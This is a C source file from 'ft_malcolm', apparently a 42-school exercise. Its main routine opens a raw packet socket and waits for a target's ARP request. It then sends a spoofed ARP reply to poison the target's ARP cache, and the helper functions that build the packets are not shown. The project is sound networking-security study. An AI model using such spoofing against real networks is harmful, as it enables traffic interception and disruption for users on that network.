/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mamartin <mamartin@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/10/04 19:03:49 by mamartin          #+#    #+#             */
/*   Updated: 2022/10/12 14:21:26 by mamartin         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <linux/if_link.h>
#include <arpa/inet.h>
#include <signal.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#include "ft_malcolm.h"
#include "shell_colors.h"

bool g_must_exit = false;

static int validate_arguments(char **argv, t_host* source, t_host* target)
{
	if (ip_addr_to_array(argv[1], source->ip, sizeof(source->ip)) != -1)
	{
		if (mac_addr_to_array(argv[2], source->ether, sizeof(source->ether)) != -1)
		{
			if (ip_addr_to_array(argv[3], target->ip, sizeof(target->ip)) != -1)
			{
				if (mac_addr_to_array(argv[4], target->ether, sizeof(target->ether)) != -1)
					return 0;
				else
					dprintf(STDERR_FILENO, "%s is not a valid MAC address\n", argv[4]);
			}
			else
				dprintf(STDERR_FILENO, "%s is not a valid IP address\n", argv[3]);
		}
		else
			dprintf(STDERR_FILENO, "%s is not a valid MAC address\n", argv[2]);
	}
	else
		dprintf(STDERR_FILENO, "%s is not a valid IP address\n", argv[1]);
	return -1;
}

static int get_interface_index()
{
	struct ifaddrs* interfaces;
	if (getifaddrs(&interfaces) != 0)
		return -1;

	struct ifaddrs *ifa;
	for (ifa = interfaces; ifa != NULL; ifa = ifa->ifa_next)
	{
		if (ifa->ifa_addr == NULL)
			continue;
		if (ifa->ifa_addr->sa_family == AF_PACKET && ft_strncmp(ifa->ifa_name, "lo", 2))
			break;
	}
	
	int index;
	if (ifa)
		index = ((struct sockaddr_ll*)ifa->ifa_addr)->sll_ifindex;
	else
		index = -1;
	freeifaddrs(interfaces);
	return index;
}

static void sigint_handler(int signum)
{
	(void)signum;
	printf("Received %sSIGINT%s. Quitting...\n", RED, RESET);
	g_must_exit = true;
}

int main(int argc, char **argv)
{
	if (argc != 5)
		print_usage(argv[0]); // exit
	signal(SIGINT, &sigint_handler);

	t_host source = {0};
	t_host target = {0};
	if (validate_arguments(argv, &source, &target) == -1)
		return EXIT_FAILURE;

	if (getuid() != 0)
		failure("root privileges are needed to create packet socket", -1);

	int ifindex = get_interface_index();
	if (ifindex == -1)
		failure("failed to retrieve network interface", -1);

	int sock = socket(AF_PACKET, SOCK_RAW | SOCK_NONBLOCK, htons(ETH_P_ARP));
	if (sock == -1)
		failure("failed to create ARP socket", -1);

	printf("Waiting for %s%s%s to request %s%s%s's MAC address...\n",
		BLUE, argv[3], RESET,
		YELLOW, argv[1], RESET
	);

	while (!g_must_exit)
	{
		int ret = wait_arp_request(sock, &source, &target);
		if (ret == -1)
			failure("failed to receive ARP request", sock);
		else if (ret)
		{
			printf("Done. Now sending spoofed source to %s%s%s...\n", BLUE, argv[3], RESET);
			if (send_arp_reply(sock, ifindex, &source, &target) == -1)
				failure("failed to send ARP reply", sock);
			else
				printf("Spoofed %sARP reply%s sent %ssuccessfully%s.\nYou may now check %sARP cache%s on %starget%s.\n",
					PURPLE, RESET,
					GREEN, RESET,
					PURPLE, RESET, 
					BLUE, RESET
				);
			break ;
		}
	}

	close(sock);
	return EXIT_SUCCESS;
}